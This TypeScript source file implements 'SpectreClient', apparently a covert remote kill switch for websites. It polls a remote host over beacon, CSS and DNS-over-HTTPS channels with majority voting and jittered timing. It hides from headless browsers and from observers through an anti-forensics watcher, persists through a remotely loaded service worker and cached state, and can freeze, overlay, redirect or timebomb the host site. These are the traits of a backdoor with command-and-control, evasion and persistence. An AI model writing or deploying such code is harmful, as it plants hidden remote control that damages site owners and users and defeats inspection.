import type { Signal, KillMode, KillModeConfig, KillState } from '../types'
import { importKey } from './crypto'
import { checkBeacon } from './channels/beacon'
import { checkCSS } from './channels/css'
import { checkDoH } from './channels/doh'
import { createWatcher, isHeadless } from './antiforensics'
import { installServiceWorker, saveStateToIDB, loadStateFromIDB } from './persistence'
import { executeFreezeMode, undoFreezeMode } from './modes/freeze'
import { executeOverlayMode, undoOverlayMode } from './modes/overlay'
import { executeRedirectMode, checkStoredRedirect } from './modes/redirect'
import { executeGhostMode } from './modes/ghost'
import { scheduleTimebomb, checkStoredTimebomb } from './modes/timebomb'

const BASE_INTERVAL = 30_000
const JITTER = 15_000

export class SpectreClient {
  private siteToken: string
  private endpoint: string
  private cryptoKey: CryptoKey | null = null
  private pollTimer: ReturnType<typeof setTimeout> | null = null
  private cleanupWatcher: (() => void) | null = null
  private dormant = false
  private killed = false

  constructor(siteToken: string, endpoint = 'https://cdn.specter.sh') {
    this.siteToken = siteToken
    this.endpoint = endpoint.replace(/\/$/, '')
  }

  async init(): Promise<void> {
    if (isHeadless()) return

    this.cryptoKey = await importKey(this.siteToken)

    // Check cached state immediately before any network request
    const cached = await loadStateFromIDB()
    if (cached?.kill) {
      this.executeMode(cached.mode, cached.config)
      this.killed = true
    }

    // Check stored redirect/timebomb from prior session
    checkStoredRedirect()
    checkStoredTimebomb((mode, config) => this.executeMode(mode, config))

    // Install Service Worker for persistence
    await installServiceWorker(`${this.endpoint}/v1/sw.js`)

    // Anti-forensics watcher
    this.cleanupWatcher = createWatcher(
      () => { this.dormant = false; this.schedulePoll(0) },
      () => { this.dormant = true }
    )

    this.schedulePoll(0)
  }

  private schedulePoll(delay: number): void {
    if (this.pollTimer) clearTimeout(this.pollTimer)
    this.pollTimer = setTimeout(() => this.poll(), delay)
  }

  private async poll(): Promise<void> {
    if (this.dormant) {
      this.schedulePoll(BASE_INTERVAL)
      return
    }

    try {
      const [s1, s2, s3] = await Promise.allSettled([
        checkBeacon(this.endpoint, this.siteToken, this.cryptoKey!),
        checkCSS(this.endpoint, this.siteToken, this.cryptoKey!),
        checkDoH(this.siteToken, this.cryptoKey!),
      ])

      const signals = [s1, s2, s3]
        .filter((r): r is PromiseFulfilledResult<Signal | null> => r.status === 'fulfilled')
        .map(r => r.value)
        .filter((s): s is Signal => s !== null)

      const killVotes = signals.filter(s => s.kill).length
      const aliveVotes = signals.filter(s => !s.kill).length

      if (killVotes >= 2 && !this.killed) {
        const signal = signals.find(s => s.kill)!
        this.killed = true
        await saveStateToIDB({ kill: true, mode: signal.mode, config: signal.config, ts: Date.now() })
        this.executeMode(signal.mode, signal.config)
      } else if (aliveVotes >= 2 && this.killed) {
        this.killed = false
        await saveStateToIDB({ kill: false, mode: 'none', config: {}, ts: Date.now() })
        this.undoMode()
      }
    } catch { /* silent */ }

    const next = BASE_INTERVAL + Math.random() * JITTER
    this.schedulePoll(next)
  }

  private executeMode(mode: KillMode, config: KillModeConfig): void {
    switch (mode) {
      case 'freeze':   executeFreezeMode(); break
      case 'overlay':  executeOverlayMode(config as any); break
      case 'redirect': executeRedirectMode((config as any).url ?? '/'); break
      case 'ghost':    executeGhostMode(); break
      case 'timebomb':
        scheduleTimebomb(
          (config as any).activateAt,
          (config as any).thenMode ?? 'freeze',
          (config as any).thenConfig ?? {},
          (m, c) => this.executeMode(m, c)
        )
        break
    }
  }

  private undoMode(): void {
    undoFreezeMode()
    undoOverlayMode()
  }

  destroy(): void {
    if (this.pollTimer) clearTimeout(this.pollTimer)
    this.cleanupWatcher?.()
    this.undoMode()
  }
}
